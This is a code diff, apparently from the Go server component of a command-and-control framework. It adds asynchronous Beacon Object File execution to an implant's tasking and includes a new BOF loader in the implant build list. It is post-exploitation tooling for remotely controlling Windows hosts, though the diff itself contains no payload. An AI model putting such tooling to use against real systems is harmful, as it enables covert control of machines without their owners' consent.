@@ -297,7 +297,7 @@ var (
 	ObjectDir_smb  = "objects_smb"
 	ObjectDir_tcp  = "objects_tcp"
 	ObjectDir_dns  = "objects_dns"
-	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
+	ObjectFiles    = [...]string{"Agent", "AgentConfig", "AgentInfo", "ApiLoader", "beacon_functions", "bof_loader", "Boffer", "Commander", "crt", "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer", "Pivotter", "ProcLoader", "Proxyfire", "std", "utils", "WaitMask"}
 	CFlags         = "-c -fno-builtin -fno-unwind-tables -fno-strict-aliasing -fno-ident -fno-stack-protector -fno-exceptions -fno-asynchronous-unwind-tables -fno-strict-overflow -fno-delete-null-pointer-checks -fpermissive -w -masm=intel -fPIC"
 	LFlags         = "-Os -s -Wl,-s,--gc-sections -static-libgcc -mwindows"
 )
@@ -977,6 +977,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 
 			taskData.Type = adaptix.TASK_TYPE_JOB
 
+			async := getBoolArg(args, "-a")
 			bofFile, err = getStringArg(args, "bof")
 			if err != nil {
 				goto RET
@@ -995,7 +996,7 @@ func (ext *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[st
 				}
 			}
 
-			array = []interface{}{COMMAND_EXEC_BOF, "go", len(bofContent), bofContent, len(params), params}
+			array = []interface{}{COMMAND_EXEC_BOF, async, "go", len(bofContent), bofContent, len(params), params}
 		} else {
 			err = errors.New("subcommand must be 'bof'")
 			goto RET
@@ -1707,8 +1708,17 @@ func (ext *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData
 			}
 
 		case COMMAND_EXEC_BOF:
-			task.Message = "BOF finished"
-			task.Completed = true
+			if false == packer.CheckPacker([]string{"byte"}) {
+				goto HANDLER
+			}
+			state := packer.ParseInt8()
+			if state == 1 {
+				task.Message = "Async BOF started"
+				task.Completed = false
+			} else {
+				task.Message = "BOF finished"
+				task.Completed = true
+			}
 
 		case COMMAND_EXEC_BOF_OUT:
 			if false == packer.CheckPacker([]string{"int"}) {
